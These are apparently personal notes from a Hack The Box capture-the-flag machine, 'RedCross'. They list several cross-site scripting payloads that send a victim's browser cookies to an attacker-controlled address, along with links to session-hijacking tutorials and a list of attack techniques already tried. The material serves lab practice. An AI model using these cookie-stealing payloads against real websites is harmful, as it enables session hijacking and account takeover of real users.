# RedCross Notes

## Data 

IP: 10.129.2.8
OS: Debian-10+deb9u3
Hostname: 
Domain: intra.redcross.htb
Machine Purpose:  
Services: 
Service Languages: php
Users:
Credentials:

First blood is 3H 7M 45S. 


#### Objectives

#### Target Map

#### Solution Inventory Map

https://medium.com/@marduk.i.am/exploiting-cross-site-scripting-to-steal-cookies-3d14c8b42fae
```html
<img src=x onerror="this.src='http://10.10.14.29/'+document.cookie; this.removeAttribute('onerror');">

<script><img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');"></script>

<!-- https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies -->
<script> fetch('http://10.10.14.29:8888', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<script>fetch('http://10.10.14.29');</script>

<script>fetch('http://10.10.14.29')</script>

<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082 - javascript multi lines payload into one line
https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81



### Todo 




Make Excalidraw

### Done


#### OLD 
- injections 
- sqlmap
- php filter and fuzzed for files
- SSRF
- different vhost/subdomain
TLS vulnerabilities are all that is left!
- https://www.exploit-db.com/exploits/32764 - server closed connections
